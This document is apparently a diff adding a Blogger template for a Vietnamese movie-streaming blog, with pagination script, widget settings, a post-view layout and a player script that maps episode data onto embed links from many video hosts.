+if(-1!=str.indexOf("/search?")||-1!=str.indexOf("archive.html"))document.write('<div style="text-align:center;padding:10px;background-color:#fae9c8;border:1px #fcb353 solid;"><img src="http://1.bp.blogspot.com/-BbKKRbQ3nvQ/VIb_YQmQ47I/AAAAAAAAAn8/KCT1lLcTuP8/s600/4251dec72b18ac89643edfb7a8300016_XL.jpg" /><br><br>R\u1ea5t ti\u1ebfc, trang m\u00e0 b\u1ea1n \u0111ang t\u00ecm kh\u00f4ng t\u1ed3n t\u1ea1i tr\u00ean webiste.<br> Click <a href="/">v\u00e0o \u0111\u00e2y</a> \u0111\u1ec3 tr\u1edf v\u1ec1 trang ch\u1ee7.</div>');
+else{var rcpage=[],numposts=20,numpage=totalPosts/numposts,lastnum=totalPosts%numposts;0==lastnum&&(numpage+=1);for(var m=1;m<numpage;m++){var start=numposts*(m-1)+1;rcpage[m]='<script src="/feeds/posts/default'+textlabel+"?start-index="+start+"&max-results="+numposts+'&orderby=published&alt=json-in-script&callback=showrecentposts">\x3c/script>'}page>numpage&&page<numpage+1&&0<lastnum?(numposts=lastnum,start=totalPosts-lastnum+1,document.write('<script src="/feeds/posts/default'+textlabel+"?start-index="+
+start+"&max-results="+numposts+'&orderby=published&alt=json-in-script&callback=showrecentposts">\x3c/script>')):page>numpage||page>numpage-1&&0==lastnum?document.write('<div style="text-align:center;padding:20px 10px;background-color:#fae9c8;border:1px #fcb353 solid;"><img src="http://1.bp.blogspot.com/-BbKKRbQ3nvQ/VIb_YQmQ47I/AAAAAAAAAn8/KCT1lLcTuP8/s600/4251dec72b18ac89643edfb7a8300016_XL.jpg" /><br><br>R\u1ea5t ti\u1ebfc, trang m\u00e0 b\u1ea1n \u0111ang t\u00ecm kh\u00f4ng t\u1ed3n t\u1ea1i tr\u00ean webiste.<br>Click <a href="http://vuighe-net.blogspot.com/">v\u00e0o \u0111\u00e2y</a> \u0111\u1ec3 tr\u1edf v\u1ec1 trang ch\u1ee7.</div>'):
+document.write(rcpage[page])};
+//]]></script>
+</div>
+<script type='text/javascript'>//<![CDATA[
+var pagelist=0==lastnum?totalPosts/numposts:numpage+1,pagelist1=parseInt(pagelist),npage=parseFloat(page);
+if(page<=parseInt(pagelist)){if(2<=pagelist&&6>pagelist1){document.write('<div class="clear"></div><span class="page_nav">');for(var n=1;n<pagelist1+1;n++){var navpage=n==npage?'<span rel="nofollow" class="current">'+n+"</span>":'<span class="item"><a href="/'+textpage+"?v="+view+"&page="+n+'">'+n+"</a></span>";document.write(navpage)}document.write("</span>")}if(6<=pagelist&&4>page){document.write('<div class="clear"></div><span class="page_nav">');for(n=1;6>n;n++)navpage=n==npage?'<span rel="nofollow" class="current">'+n+"</span>":
+'<span class="item"><a href="/'+textpage+"?v="+view+"&page="+n+'">'+n+"</a></span>",document.write(navpage);5<parseInt(pagelist)?document.write('<a href="/'+textpage+"?v="+view+"&page="+n+'">Trang k\u1ebf \u2192</a></div>'):document.write("</span>")}else if(6<=pagelist&&3<page&&page<parseInt(pagelist)-2){var f=page-3,first=page-2,last=first+5;document.write('<div class="clear"></div><span class="page_nav"><a href="/'+textpage+"?v="+view+"&page="+f+'">\u2190 Trang tr\u01b0\u1edbc</a>');for(n=first;n<last;n++)navpage=n==npage?
+'<span rel="nofollow" class="current">'+n+"</span>":'<span class="item"><a href="/'+textpage+"?v="+view+"&page="+n+'">'+n+"</a></span>",document.write(navpage);document.write('<a href="/'+textpage+"?v="+view+"&page="+n+'">Trang k\u1ebf \u2192</a></div>')}else if(6<=pagelist&&3<page&&page>parseInt(pagelist)-3){f=parseInt(pagelist)-5;first=parseInt(pagelist)-4;last=parseInt(pagelist)+1;document.write('<div class="clear"></div><span class="page_nav"><a href="/'+textpage+"?v="+view+"&page="+f+'">\u2190 Trang tr\u01b0\u1edbc</a>');
+for(n=first;n<last;n++)navpage=n==npage?'<span rel="nofollow" class="current">'+n+"</span>":'<span class="item"><a href="/'+textpage+"?v="+view+"&page="+n+'">'+n+"</a></span>",document.write(navpage);document.write("</span>")}};
+//]]></script>
+</div>
+</b:if>
+</b:if>
+<b:section id='mainl' showaddelement='yes'>
+  <b:widget id='Blog1' locked='true' title='Bài đăng trên Blog' type='Blog' version='1'>
+    <b:widget-settings>
+      <b:widget-setting name='showDateHeader'>true</b:widget-setting>
+      <b:widget-setting name='style.textcolor'>#000000</b:widget-setting>
+      <b:widget-setting name='showShareButtons'>true</b:widget-setting>
+      <b:widget-setting name='authorLabel'>By</b:widget-setting>
+      <b:widget-setting name='showCommentLink'>true</b:widget-setting>
+      <b:widget-setting name='style.urlcolor'>#008000</b:widget-setting>
+      <b:widget-setting name='showAuthor'>true</b:widget-setting>
+      <b:widget-setting name='style.linkcolor'>#0000ff</b:widget-setting>
+      <b:widget-setting name='style.unittype'>TextAndImage</b:widget-setting>
+      <b:widget-setting name='style.bgcolor'>#ffffff</b:widget-setting>
+      <b:widget-setting name='showAuthorProfile'>false</b:widget-setting>
+      <b:widget-setting name='style.layout'>1x1</b:widget-setting>
+      <b:widget-setting name='showLabels'>true</b:widget-setting>
+      <b:widget-setting name='showLocation'>true</b:widget-setting>
+      <b:widget-setting name='showTimestamp'>true</b:widget-setting>
+      <b:widget-setting name='postsPerAd'>1</b:widget-setting>
+      <b:widget-setting name='showBacklinks'>false</b:widget-setting>
+      <b:widget-setting name='style.bordercolor'>#ffffff</b:widget-setting>
+      <b:widget-setting name='showInlineAds'>false</b:widget-setting>
+      <b:widget-setting name='showReactions'>false</b:widget-setting>
+    </b:widget-settings>
+    <b:includable id='main' var='top'>
+  <b:if cond='data:mobile == &quot;false&quot;'>
+
+    <!-- posts -->
+    <div class='blog-posts thumb-p'>
+	
+      <b:include data='top' name='status-message'/>
+
+      <data:defaultAdStart/>
+      <b:loop values='data:posts' var='post'>
+        <b:if cond='data:post.isDateStart'>
+          <b:if cond='data:post.isFirstPost == &quot;false&quot;'>
+            &lt;/div&gt;&lt;/div&gt;
+          </b:if>
+        </b:if>
+        <b:if cond='data:post.isDateStart'>
+          &lt;div class=&quot;date-outer&quot;&gt;
+        </b:if>
+				
+
+        <b:if cond='data:post.isDateStart'>
+          &lt;div class=&quot;date-posts&quot;&gt;
+        </b:if>
+        <div class='post-outer'>
+        <b:include data='post' name='post'/>
+        <b:if cond='data:blog.pageType == &quot;static_page&quot;'>
+          <b:if cond='data:post.showThreadedComments'>
+            <b:include data='post' name='threaded_comments'/>
+          <b:else/>
+            <b:include data='post' name='comments'/>
+          </b:if>
+        </b:if>
+        <b:if cond='data:blog.pageType == &quot;item&quot;'>
+          <b:if cond='data:post.showThreadedComments'>
+            <b:include data='post' name='threaded_comments'/>
+          <b:else/>
+            <b:include data='post' name='comments'/>
+          </b:if>
+        </b:if>
+        </div>
+        <b:if cond='data:post.includeAd'>
+          <b:if cond='data:post.isFirstPost'>
+            <data:defaultAdEnd/>
+          <b:else/>
+            <data:adEnd/>
+          </b:if>
+          <div class='inline-ad'>
+            <data:adCode/>
+          </div>
+          <data:adStart/>
+        </b:if>
+      </b:loop>
+      <b:if cond='data:numPosts != 0'>
+        &lt;/div&gt;&lt;/div&gt;
+      </b:if>
+      <data:adEnd/>
+	  
+	  
+    <!-- navigation -->
+<div class='clear'/>	
+    </div>
+
+
+    <!-- feed links -->
+
+
+    <b:if cond='data:top.showStars'>
+      <script src='//www.google.com/jsapi' type='text/javascript'/>
+      <script type='text/javascript'>
+        google.load(&quot;annotations&quot;, &quot;1&quot;, {&quot;locale&quot;: &quot;<data:top.languageCode/>&quot;});
+        function initialize() {
+          google.annotations.setApplicationId(<data:top.blogspotReviews/>);
+          google.annotations.createAll();
+          google.annotations.fetch();
+        }
+        google.setOnLoadCallback(initialize);
+      </script>
+    </b:if>
+
+  <b:else/>
+    <b:include name='mobile-main'/>
+  </b:if>
+
+  <b:if cond='data:top.showDummy'>
+    <data:top.dummyBootstrap/>
+  </b:if>
+
+</b:includable>
+    <b:includable id='backlinkDeleteIcon' var='backlink'>
+</b:includable>
+    <b:includable id='backlinks' var='post'>
+</b:includable>
+    <b:includable id='comment-form' var='post'>
+
+</b:includable>
+    <b:includable id='commentDeleteIcon' var='comment'>
+</b:includable>
+    <b:includable id='comment_count_picker' var='post'>
+</b:includable>
+    <b:includable id='comment_picker' var='post'>
+</b:includable>
+    <b:includable id='comments' var='post'>
+ 
+</b:includable>
+    <b:includable id='feedLinks'>
+
+</b:includable>
+    <b:includable id='feedLinksBody' var='links'>
+  
+</b:includable>
+    <b:includable id='iframe_comments' var='post'>
+</b:includable>
+    <b:includable id='mobile-index-post' var='post'>
+ 
+</b:includable>
+    <b:includable id='mobile-main' var='top'>
+
+</b:includable>
+    <b:includable id='mobile-nextprev'>
+</b:includable>
+    <b:includable id='mobile-post' var='post'>
+</b:includable>
+    <b:includable id='nextprev'>
+</b:includable>
+    <b:includable id='post' var='post'>
+
+<!-- POST VIEW -->
+<b:if cond='data:blog.pageType == &quot;item&quot;'>	
+<div id='vlight_shape' style='display: none; z-index: 300; opacity: 0.9; top: 0pt; left: 0pt; bottom: 0pt; right: 0pt; position: fixed; background: rgb(0, 0, 0);'/>
+<div class='block info-film watch-film' itemscope='' itemtype='http://schema.org/Movie' style='display:block;'>
+<div class='row'>
+<div class='col-sm-3 visible-sm-block col-xs-1 visible-xs-block'/>
+<div class='col1 col-md-3 col-sm-8 col-xs-10'>
+<div class='poster'><span class='status'>HD</span> 
+<img expr:href='data:post.url' expr:src='data:blog.postImageUrl' expr:title='data:post.title'/>
+<div class='tools-box' style='display:block;'><div class='tools-box-bookmark normal' style='display: block;'><span class='bookmark-status'><i class='fa fa-gittip'/></span><span class='bookmark-action'/></div></div> 
+</div>
+</div>
+<div class='clearfix visible-sm-block visible-xs-block'/>
+<div class='col2 col-md-9'>
+<div class='name2'><dfn><data:post.title/></dfn></div>
+<dl>
+<dt>Đăng bởi:</dt><dd class='status'><data:post.author/> - <data:post.timestamp/></dd><br/>
+<dd><data:post.snippet/></dd>
+</dl>
+<div class='extra-info'><div class='views'> <i class='micon views'/> <span>1 Tỷ</span> </div><div class='like'> <i class='micon heart'/> <span>1 lượt</span> </div><div class='imdbs'> <i class='micon imdb'/> <span>N/A</span> </div>
+</div>
+</div></div></div>
+<div class='block media'>
+<div class='ad_location desktop' id='ads_location'>
+<img src='http://i.imgur.com/0fjZFNH.jpg'/>
+</div>
+<div class='block-body' style='position: relative;'>
+
+<div id='sonpro'><div id='abd_mv'>
+<div class='jwplayer jw-reset jw-skin-phimhayplus jw-stretch-uniform jw-state-paused jw-flag-user-inactive' id='player-area' style='width: 100%; height: 100%;' tabindex='0'>
+<div id='anc_pl'/><div class='clear'/><div id='anc_dx'/>
+</div>
+</div></div>
+
+<div class='controls' itemscope='' itemtype='http://data-vocabulary.org/Review-aggregate'>
+<div class='item widget rating' data-count='2' data-scores='6'> <span class='stars'> <i class='fa fa-star' data='1' rel='fa fa-star' title='Quá dở'/><i class='fa fa-star' data='2' rel='fa fa-star' title='Dở'/><i class='fa fa-star' data='3' rel='fa fa-star' title='Bình thường'/><i class='fa fa-star-o' data='4' rel='fa fa-star-o' title='Hay'/><i class='fa fa-star-o' data='5' rel='fa fa-star-o' title='Quá hay'/> </span> <span class='text' data-text='%s luợt'> 6 / 2 lượt </span> </div> 
+<span class='hidden' itemprop='votes'>2</span> 
+<span class='hidden' itemprop='rating' itemscope='' itemtype='http://data-vocabulary.org/Rating'> <span itemprop='average'>6</span>
+  <meta content='10' itemprop='best'/>
+  <meta content='1' itemprop='worst'/> </span>
+<div class='item remove-ad'><span class='wrap' id='hide_ads' onclick='hide_ads();return false;'>Tắt Quảng Cáo</span></div>
+<div class='item toggle-size right hidden-sm hidden-xs' data-off='Phóng to' data-on='Thu nhỏ'> 
+<span class='wrap' id='resize_p' onclick='resize_player();return false;'>Phóng To</span>
+</div>
+<div class='item toggle-error right hidden-sm hidden-xs'> 
+<span class='wrap'>Báo lỗi</span> 
+</div>
+<div class='item toggle-light right hidden-sm hidden-xs'> 
+<span class='wrap' id='hide_light' onclick='hide_light();return false;'>Tắt Đèn</span>
+</div>
+</div></div>
+</div>
+<div class='block fblikepl' style='margin-top:10px;'> 
+<div class='block-body'>
+<div class='likephim'><div class='fb-like' data-action='like' data-colorscheme='light' data-layout='button_count' data-send='true' data-show-faces='true' expr:data-href='data:post.url'/></div> 
+<div class='guibanbe'>Bấm vào <div class='fb-send'/> để gửi phim này cho bạn bè cùng xem !</div> 
+</div> 
+</div> 
+<div class='block servers'><div class='server' data-type='watch'><div id='anc_tp'/></div></div>
+<div class='tab_container'>
+<input checked='' id='tab1' name='tabs' type='radio'/><label for='tab1'>Bài Liên Quan</label>
+<input id='tab2' name='tabs' type='radio'/><label for='tab2'>Thông Tin Phim</label>
+<input id='tab3' name='tabs' type='radio'/><label for='tab3'>Bình Luận</label>
+<section class='tab-content' id='content1'>
+<div class='block list-film-slide'>
+<div class='widget-title'><h3 class='title'>Phim liên quan</h3> </div>
+<div class='block-body'>
+<div class='list-film row'>
+<b:loop values='data:post.labels' var='label'>
+<script expr:src='&quot;/feeds/posts/default/-/&quot; + data:label.name + &quot;?alt=json-in-script&amp;callback=bay_lq&amp;max-results=16&quot;' type='text/javascript'/>
+</b:loop>
+<script type='text/javascript'>var currentposturl=&quot;<data:post.url/>&quot;;var maxresults=16;;printRelatedLabels_thumbs();</script>
+</div> 
+</div> 
+
+
+</div> 
+</section>
+<section class='tab-content' id='content2'>
+<div class='block info-film-text'>
+<div class='widget-title clear-top'> <div class='tabs'> <div class='tab active'><span>Thông tin</span></div> </div> </div>
+<div class='block-body'>
+<div id='anc_data'><data:post.body/></div>
+<div style='width:100%;overflow:hidden;'/></div>
+<div class='block block-tags'>
+<div class='widget-title'>
+<h3 class='title'>Từ khóa</h3></div> 
+<div class='block-body slider'>
+<p class='tags'><b:if cond='data:post.labels'><b:loop values='data:post.labels' var='label'><a expr:href='data:label.url' rel='tag'><data:label.name/></a><b:if cond='data:label.isLast != &quot;true&quot;'>, </b:if></b:loop></b:if></p>
+</div> 
+</div> 
+</div> 
+</section>
+<section class='tab-content' id='content3'>
+<div class='block comment'>
+<div class='block-body'>
+<div class='fb-comments' data-num-posts='10' data-width='100%' expr:href='data:post.canonicalUrl'/>
+</div> 
+</div> 
+</section>
+</div> 
+<script type='text/javascript'>
+//<![CDATA[ 
+var img_player = document.querySelectorAll('#anc_data img')[0].src
+var ancplayer = {
+	load: {
+		'width': '100%',
+		'height': '100%',
+		'player': 'http://www.bphim.net',
+		'proxy': 'http://www.bphim.net',
+		'skin': 'http://www.bphim.net',
+		'getlink': 'http://server2-vietsubhd.rhcloud.com/get',
+		'imgload': 'https://lh3.googleusercontent.com/-MkNW0HTmPFY/VzHD06lJ8dI/AAAAAAAAArA/q0YUwupUj4MsDzWA7582AAHez_ZR_VsqACLcB/s1600/coollogo_com-7711997%2B%25281%2529.png',
+		'autoplay': 'false',
+		'embedplay': '0',
+		'site': 'Bphim.Net'
+	},
+	sv: {
+		'list_sv': 
+'youtube.com,anc.you,anc.yl,anc.mp4,mp4.tm,anc.flv,picasaweb.google.com,anc.ps,anc.tm,anc.lt,anc.nhoclak,plus.google.com,docs.google.com,drive.google.com,tv.zing.vn/video,tv.zing.vn/embed/video,tv.zing.vn/html5/video,tv.zing.vn/html5/movie,nhaccuatui.com,dailymotion.com,xvideos.com,goo.gl,clip.vn,meme.vn,googlevideo.com,mphim.net,banhtv.com,zone5s.com,phim4v.com,phim7.com,hayphim.tv,vietsubhd.tk,xemphimso.com,phim2b.com,phimmoi.net,3.bp.blogspot.com,zippyshare.com,bilutv.com,fptplay.net,phimbathu.com,anime47.com,onecloud.media,fshare.vn,blip.tv,sendspace.com,speedyshare.com,tunescoop.com,viddler.com,vimeo.com,vidxden.com,openload.co,phim14.net',
+       'ten_sv':
+'Youtube: <div class="sprites icons16 btn_usa">,Youtube 2: <div class="sprites icons16 btn_usa">,Gdata: <div class="sprites icons16 btn_usa">,Sever VIP: <div class="sprites icons16 btn_vn">,Thuyết Minh: <div class="sprites icons16 btn_usa">,Sever FLV: <div class="sprites icons16 btn_usa">,Picasa: <div class="sprites icons16 btn_usa">,Picasa 2: <div class="sprites icons16 btn_usa">,Thuyết Minh: <div class="sprites icons16 btn_usa">,Lồng Tiếng: <div class="sprites icons16 btn_usa">,Picasa 3: <div class="sprites icons16 btn_usa">,G-Plus: <div class="sprites icons16 btn_usa">,Sever Quốc Tế: <div class="sprites icons16 btn_usa">,Sever VIP 2: <div class="sprites icons16 btn_vn">,Z-PRO#1: <div class="sprites icons16 btn_vn">,Z-PRO#2: <div class="sprites icons16 btn_vn">,Z-PRO#MB: <div class="sprites icons16 btn_vn">,Z-PRO#EP: <div class="sprites icons16 btn_vn">,NCT-PRO: <div class="sprites icons16 btn_vn">,Daily: <div class="sprites icons16 btn_usa">,Xvideos: <div class="sprites icons16 btn_usa">,Go-PRO: <div class="sprites icons16 btn_usa">,ClipVN: <div class="sprites icons16 btn_vn">,Meme: <div class="sprites icons16 btn_usa">,G-Google: <div class="sprites icons16 btn_usa">,Sever VIP 3: <div class="sprites icons16 btn_usa">,Get Banhtv: <div class="sprites icons16 btn_usa">,Sever New 2: <div class="sprites icons16 btn_vn">,Sever VIP 4: <div class="sprites icons16 btn_usa">,Sever VIP 5: <div class="sprites icons16 btn_usa">,Sever VIP 6: <div class="sprites icons16 btn_usa">,Sever HOT: <div class="sprites icons16 btn_vn">,Sever VIP 7: <div class="sprites icons16 btn_vn">,Sever Khác: <div class="sprites icons16 btn_usa">,Sever SiêuVIP: <div class="sprites icons16 btn_vn">,Sever Google: <div class="sprites icons16 btn_usa">,Zippy: <div class="sprites icons16 btn_usa">,Get Bilutv: <div class="sprites icons16 btn_usa">,FPT-PRO: <div class="sprites icons16 btn_vn">,Get Phimbathu: <div class="sprites icons16 btn_usa">,Get Anime47: <div class="sprites icons16 btn_usa">,Get Onecloud: <div class="sprites icons16 btn_usa">,Get Fshare: <div class="sprites icons16 btn_usa">,Bliptv: <div class="sprites icons16 btn_usa">,Sendspace: <div class="sprites icons16 btn_usa">,Speedyshare: <div class="sprites icons16 btn_usa">,Tunescoop: <div class="sprites icons16 btn_usa">,Viddler: <div class="sprites icons16 btn_usa">,Vimeo: <div class="sprites icons16 btn_usa">,Vidxden: <div class="sprites icons16 btn_usa">,Bphim: <div class="sprites icons16 btn_usa">,Get Phim14: <div class="sprites icons16 btn_vn">',}
+}
+//]]></script>
+<script type='text/javascript'>
+//<![CDATA[
+function ancMedia() {
+  url = window.location.href,
+  home = ancplayer.load.site, 
+  server_i = [0];
+    part = new Array; 
+  sv = ancplayer.sv.list_sv.split(",");
+  tensv = ancplayer.sv.ten_sv.split(",");
+  width = ancplayer.load.width;
+  height = ancplayer.load.height;
+  player = ancplayer.load.player;
+  proxy = ancplayer.load.proxy;
+  skin = ancplayer.load.skin;
+  imgload = ancplayer.load.imgload; 
+  tmget = ancplayer.load.getlink; 
+  auto = ancplayer.load.autoplay;
+  eauto = ancplayer.load.embedplay;
+
+	var $_  = function(x){return document.getElementById(x);}
+    this.fu  = function (x, y, z) {
+		if (y == null && z == null) {
+			return document.getElementById(x).innerHTML;
+		} else { if (y != null && z == null) 
+		       { document.getElementById(x).innerHTML = y }
+		  else { document.getElementById(x).style[z] = y }
+		}
+	};
+
+	this.read = function () {
+		b = this.fu("anc_data"),
+		c = '<div id="b_data" style="display:none !important;">',
+		d = '</div>',
+		b = b.replace(/\<id\>/gi, c),
+		b = b.replace(/\<\/id\>/gi, d);
+		b = b.replace(/\[id\]/gi, c),
+		b = b.replace(/\[\/id\]/gi, d),
+		this.fu("anc_data", b);
+		if(b.indexOf("anc*") != -1){
+		b = this.fu("b_data");
+		b = b.replace("anc*","");
+		b = b.substring(0,b.length);
+	    b = decodeanc(b);
+		if(b.indexOf("|") <= 0) {b = ";" + b + "|" };
+	}	else{b = this.fu("b_data"); if(b.indexOf("|") <= 0) {b = ";" + b + "|" };}
+		return  b
+	};
+	
+data = this.read();
+  
+l_spi = data.split("|").length; 
+l_spk = function(x) {return data.split("|")[x].split(";").length;};
+d_spi = function(x) {return data.split("|")[x];};
+d_spk = function(x, y) {return data.split("|")[x].split(";")[y];};
+pc = ["0","a","b","c","d","e","f","g","h","i","k","l","m","n","o","p","q","r","s"];
+
+  svt = "";
+  svx = 0;
+
+
+this.setCookie = function(c_name,value,exdays) {
+var exdate=new Date();
+exdate.setDate(exdate.getDate() + exdays);
+var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
+document.cookie=c_name + "=" + c_value;
+};
+this.getCookie = function(c_name) {
+var i,x,y,ARRcookies=document.cookie.split(";");
+for (i=0;i<ARRcookies.length;i++){
+x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
+y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
+x=x.replace(/^\s+|\s+$/g,"");
+if (x==c_name){return unescape(y);}}
+};
+  
+this.Play = function() {
+for(var s = 0;s < tensv.length ;s++) {var svr = tensv[s].split(".")[0];if(svr == ""){svr = home;}part[s] = '<li id="sev_'+s+'" class="sev" style="font-size: 15px;margin-bottom: 15px;display: none;">'+svr+' <li><li class="clear"></li>' }
+for (var i = 0; i < l_spi -1; i++) {
+for (var j = 0; j < l_spk(i); j++) 
+{ name = d_spk(i, 0); link = d_spk(i, j);
+name = 2 == l_spk(i) ? d_spk(i, 0) : name == d_spk(i + 1, 0) || !Number(name) ? name + pc[j] : name + pc[j];
+
+for(var s = 0;s < sv.length; s++) {
+//if(d_spk(0, 1).indexOf(sv[s]) != -1) { this.setCookie("ancplayer", s , 365); }
+if (d_spk(0, 1).indexOf(sv[s]) != -1) {this.setCookie("_ancServer", s, 365); }
+if(link.indexOf(sv[s]) != -1) { 
+if(sv[s]) {data_out = '<li class="ep"><a class="a_tap" id="ep_'+i+'" href="?xem='+s+'-'+i+'-'+j+'" title="'+name+' - '+home+'" >'+name+'</a></li>' } 
+part[s] += data_out } } } }
+
+for(var s = 0;s < sv.length; s++) {
+if(part[s].indexOf(home) != -1) {
+svt += '<ul id="server_'+svx+'" > '+part[s]+' <div class="clear"></div></ul>';		
+server_i[s] = svx.toString();
+svx++
+}}
+
+svt = '<div id="list_tap"> '+svt+' <div class="clear"></div></div><div class="clear"></div>';
+
+this.fu("anc_tp", svt);
+this.getUrl()
+};
+
+
+this.getUrl = function() {
+  String.prototype.GetPart = function(dcmm) {
+    var vltn = new RegExp("(^|&)" + dcmm + "=([^&]*)(&|$)");
+    var clgt = this.substr(this.indexOf("?") + 1).match(vltn);
+    if (clgt != null) {
+      return unescape(clgt[2]);
+    }
+    return null;
+  };
+  
+
+
+	//if(part_Url == null) { part_Url = ""+laylinksv+"-0-1" }
+    part_Url = url.GetPart("xem");
+    if(part_Url == null) { part_Url = this.getCookie("_ancServer") + "-0-1" }	
+    part_Url = part_Url.split("-");
+    pserver = part_Url[0];
+    pepisode = part_Url[1];
+    pelink = part_Url[2];
+	
+    var bh = this.fu("server_0");
+    var bj = this.fu("server_" + server_i[pserver]);
+    this.fu("server_" + server_i[pserver], bh);
+    this.fu("server_0", bj);
+	document.getElementById("ep_" + pepisode).className = "tap_active";
+	document.getElementById("sev_" + pserver).className = "sv_active";
+
+	if (!d_spk(pepisode, pelink)) {window.location.href = url.split("?")[0];} 
+	else {this.load(d_spk(pepisode, pelink));}
+		
+  };
+  
+this.load = function(x) {	
+if(x.indexOf(sv[0]) != -1){x = x.replace(/\/watch\?v=/gi,"/embed/"); x = x.replace(/\feature\=player\_embedded/gi,""); x = x.replace(/\#sub=/gi,"&captions.file="); obj = DBOj(x)[1];} // youtube
+if(x.indexOf(sv[1]) != -1){x = x.replace(/anc\.you\/watch\?v=/gi,"http://youtube.com/embed/");x = x.replace(/\#sub=/gi,"&captions.file=");obj = DBOj(x)[1];}	 // youtube
+if(x.indexOf(sv[2]) != -1){x = x.replace(/anc\.yl/gi,"http://www.youtube.com/p");obj = DBOj(x)[1];}  // Gdata youtube
+if(x.indexOf(sv[3]) != -1){x = x.replace(/anc\.mp4\/http/gi,"http"); x = x.replace(/\#sub=/gi,"&captions.file=");obj = DBOj(x)[12];} //mp4
+if(x.indexOf(sv[4]) != -1){x = x.replace(/mp4\.tm\/http/gi,"http"); x = x.replace(/\#sub=/gi,"&captions.file=");obj = DBOj(x)[12];} //mp4 TM
+if(x.indexOf(sv[5]) != -1){x = x.replace(/anc\.flv\/http/gi,"http"); x = x.replace(/\#sub=/gi,"&captions.file=");obj = DBOj(x)[12];}  // FLV
+if(x.indexOf(sv[6]) != -1){x = x.replace(/\*/gi,"&");x = x.replace(/\@/gi,"&"); x = x.replace(/\#sub=/gi,"&captions.file="); obj = DBOj(x)[0];}  // Picasa 1
+if(x.indexOf(sv[7]) != -1){x = x.replace(/anc\.ps/gi,"https://picasaweb.google.com"); x = x.replace(/\*/gi,"&");x = x.replace(/\@/gi,"&"); x = x.replace(/\#sub=/gi,"&captions.file="); obj = DBOj(x)[0];}  // Picasa 2
+if(x.indexOf(sv[8]) != -1){x = x.replace(/anc\.tm/gi,"https://picasaweb.google.com"); x = x.replace(/\*/gi,"&");x = x.replace(/\@/gi,"&"); x = x.replace(/\#sub=/gi,"&captions.file="); obj = DBOj(x)[0];}  // Picasa 3
+if(x.indexOf(sv[9]) != -1){x = x.replace(/anc\.lt/gi,"https://picasaweb.google.com"); x = x.replace(/\*/gi,"&");x = x.replace(/\@/gi,"&"); x = x.replace(/\#sub=/gi,"&captions.file="); obj = DBOj(x)[0];}  // Picasa 4
+if(x.indexOf(sv[10]) != -1){x = x.replace(/anc\.nhoclak/gi,"https://picasaweb.google.com"); x = x.replace(/\*/gi,"&");x = x.replace(/\@/gi,"&"); x = x.replace(/\#sub=/gi,"&captions.file="); obj = DBOj(x)[0];}  // Picasa 5
+if(x.indexOf(sv[11]) != -1){x = x.replace(/\*/gi,"&");x = x.replace(/\@/gi,"&"); x = x.replace(/\#sub=/gi,"&captions.file=");obj = DBOj(x)[0];}  //{v = x.match(/[\d\w]+/gi); obj = DBOj(v)[5]}    /*plus*/ 
+if(x.indexOf(sv[12]) != -1){x = x.replace(/edit\?pli\=1/gi,"preview?pli=1"); x = x.replace(/\#sub=/gi,"&captions.file=");obj = DBOj(x)[1];}  
+// Docs Google
+if(x.indexOf(sv[13]) != -1){x = x.replace(/edit/gi,"preview"); x= x.replace(/\#sub=/gi,"&sub="); obj = DBOj(x)[3];}  // Driver Google
+if(x.indexOf(sv[14]) != -1){obj = DBOj(x)[13]}  //{v = x.match(/[\d\w]+/gi); c = v.length - 2; obj = DBOj(v[c])[13];} // Zing
+if(x.indexOf(sv[15]) != -1){obj = DBOj(x)[13]}  //{v = x.match(/[\d\w]+/gi); c = v.length - 1; obj = DBOj(v[c])[13];} // Zing
+if(x.indexOf(sv[16]) != -1){obj = DBOj(x)[13]}  // Zing mobile
+if(x.indexOf(sv[17]) != -1){obj = DBOj(x)[13]}  // Zing PS
+if(x.indexOf(sv[18]) != -1){obj = DBOj(x)[1]} //{v = x.match(/[\d\w]+/gi); c = v.length - 2; obj = DBOj(v[c])[0];} // nct
+if(x.indexOf(sv[19]) != -1){x = x.replace(/\#sub=/gi,"&sub="); obj = DBOj(x)[5]} //NCT
+if(x.indexOf(sv[20]) != -1){x = x.replace(/\#sub=/gi,"&captions.file="); obj = DBOj(x)[1]}   /*xvideos*/ 
+if(x.indexOf(sv[21]) != -1){obj = DBOj(x)[2]}   /*Goo.gl*/ 
+if(x.indexOf(sv[22]) != -1){x = x.replace(/\#sub=/gi,"&captions.file="); obj = DBOj(x)[1]}   //Clipvn
+if(x.indexOf(sv[23]) != -1){x = x.replace(/\#sub=/gi,"&captions.file="); obj = DBOj(x)[1]}   //MEME.VN
+if(x.indexOf(sv[24]) != -1) {x = x.replace(/\*/gi,"&");x = x.replace(/\@/gi,"&");x = x.replace(/\#sub=/gi,"&captions.file=");obj = DBOj(x)[2];}  // googlevideo.com
+if(x.indexOf(sv[25]) != -1){x = x.replace(/\#sub=/gi,"&sub="); obj = DBOj(x)[4]} //mphim
+if(x.indexOf(sv[26]) != -1){x = x.replace(/\#sub=/gi,"&sub="); obj = DBOj(x)[5]} //banhtv.com
+if(x.indexOf(sv[27]) != -1){x = x.replace(/\#sub=/gi,"&sub="); obj = DBOj(x)[6]} //zone5s
+if(x.indexOf(sv[28]) != -1){x = x.replace(/\#sub=/gi,"&sub="); obj = DBOj(x)[7]} //phim4v
+if(x.indexOf(sv[29]) != -1){x = x.replace(/\#sub=/gi,"&sub="); obj = DBOj(x)[8]} //phim7
+if(x.indexOf(sv[30]) != -1){x = x.replace(/\#sub=/gi,"&sub="); obj = DBOj(x)[9]} //hayphimtv
+if(x.indexOf(sv[31]) != -1){x = x.replace(/pm\.net\//gi,""); x = x.replace(/\#sub=/gi,"&sub="); obj = DBOj(x)[10];}  // driver ma hoa driver.knm
+if(x.indexOf(sv[32]) != -1){x = x.replace(/\#sub=/gi,"&sub="); obj = DBOj(x)[11]} //xemphimso
+if(x.indexOf(sv[33]) != -1){x = x.replace(/phim2b\.com\//gi,""); x = x.replace(/\#sub=/gi,"&sub="); obj = DBOj(x)[14];}  // embed
+if(x.indexOf(sv[34]) != -1){x = x.replace(/\#sub=/gi,"&sub="); obj = DBOj(x)[15]} //phimmoi
+if(x.indexOf(sv[35]) != -1){x = x.replace(/anc\.blog\/http/gi,"http"); x = x.replace(/\#sub=/gi,"&sub=");obj = DBOj(x)[2];}  // blogspot
+for(var k = 36; k < sv.length; k++){if(x.indexOf(sv[k]) != -1){x = x.replace(/\#sub=/gi,"&captions.file=");obj = DBOj(x)[1]};}
